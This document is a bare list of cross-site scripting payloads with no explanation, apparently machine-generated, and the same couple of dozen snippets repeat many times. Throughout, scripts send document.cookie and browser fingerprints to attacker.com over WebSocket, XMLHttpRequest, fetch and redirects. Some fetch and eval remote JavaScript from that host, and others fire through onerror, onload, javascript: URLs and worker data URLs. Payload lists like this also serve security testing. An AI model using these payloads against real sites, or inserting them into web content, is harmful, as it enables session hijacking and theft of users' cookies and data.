<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<svg onload="alert(1)"></svg>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
